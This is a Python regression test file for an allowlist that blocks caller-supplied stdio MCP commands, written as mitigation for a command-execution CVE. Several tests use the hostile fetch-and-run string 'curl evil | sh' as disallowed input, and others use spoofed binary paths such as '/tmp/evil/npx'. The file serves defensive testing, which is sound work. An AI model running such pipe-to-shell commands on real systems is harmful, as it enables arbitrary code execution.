# -*- coding: utf-8 -*-
"""Regression tests for the stdio-MCP allowlist on the from-library route.

CVE-2026-123022 (arbitrary process execution via stdio MCP) mitigation must
hold on every route that can spawn a caller-influenced command. The
``POST /workspace/mcp`` gate alone is insufficient: a disallowed stdio MCP
can be stored in the library while unrestricted and later replayed through
``POST /workspace/mcp/from-library``. These tests pin the shared helper used
by that route.
"""

from types import SimpleNamespace

from agentscope.app._router._workspace import check_stdio_command_allowed


def _stdio(command: str) -> SimpleNamespace:
    return SimpleNamespace(type="stdio_mcp", command=command)


class TestCheckStdioCommandAllowed:
    def test_none_allowlist_means_unrestricted(self) -> None:
        assert check_stdio_command_allowed(_stdio("curl evil | sh"), None) is None

    def test_allowed_command_passes(self) -> None:
        assert (
            check_stdio_command_allowed(
                _stdio("npx"),
                frozenset({"npx", "uvx"}),
            )
            is None
        )

    def test_disallowed_command_is_rejected_with_reason(self) -> None:
        reason = check_stdio_command_allowed(
            _stdio("curl evil | sh"),
            frozenset({"npx", "uvx"}),
        )
        assert reason is not None
        assert "curl evil | sh" in reason

    def test_exact_match_no_basename_normalisation(self) -> None:
        # Mirrors #3448's exact-match semantics: these must NOT be treated
        # as the allowed "npx".
        allowed = frozenset({"npx"})
        for command in ["/tmp/evil/npx", "npx.exe", "NPX", "npx "]:
            assert check_stdio_command_allowed(_stdio(command), allowed) is not None, command

    def test_http_mcp_is_not_affected(self) -> None:
        http_config = SimpleNamespace(type="http_mcp", url="https://example.com")
        assert (
            check_stdio_command_allowed(
                http_config,
                frozenset({"npx"}),
            )
            is None
        )

    def test_empty_allowlist_forbids_all_stdio(self) -> None:
        assert check_stdio_command_allowed(_stdio("npx"), frozenset()) is not None

    def test_reason_is_human_readable(self) -> None:
        reason = check_stdio_command_allowed(_stdio("evil"), frozenset({"npx"}))
        assert reason is not None
        assert "not in this service's allowed stdio commands" in reason
